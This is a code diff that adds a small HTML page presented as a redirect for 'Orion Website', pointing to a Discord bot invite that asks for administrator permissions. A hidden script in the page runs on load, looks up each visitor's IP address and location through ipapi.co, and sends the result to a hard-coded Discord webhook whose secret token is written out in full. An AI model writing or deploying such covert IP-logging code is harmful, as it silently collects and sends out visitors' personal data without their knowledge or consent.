@@ -1,0 +1,39 @@
+<head>
+  <title>Orion Website</title>
+  <!--<link rel="icon" href="images/favicon-96x96.png" type="image/x-icon" width="256" height="256">-->
+  <meta http-equiv="refresh" content="0"; URL="https://discord.com/oauth2/authorize?client_id=866789606384205845&permissions=8&scope=bot%20applications.commands" />
+  </head>
+</head>
+
+
+
+<body>
+<p>redirecting you now...</p>
+</body>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script defer>
+
+function discordMessage(webHookURL, message) {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", webHookURL, true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+  'content': message,
+  'username':'AI',
+  }));
+}
+
+
+
+  $.getJSON('https://ipapi.co/json/', function(data) {
+    console.log(JSON.stringify(data, null, 2));
+  })
+  .then((ip) => {
+    var webhook = 'https://discord.com/api/webhooks/867658031767748618/bTKiCITYPbowpGhy_F2afFNvzFTog5ZT5AZCVLOUHjdm3ho58Cl-_NT1oZBiMdEks5fa'
+    discordMessage(webhook, ip)
+  })
+
+
+</script>
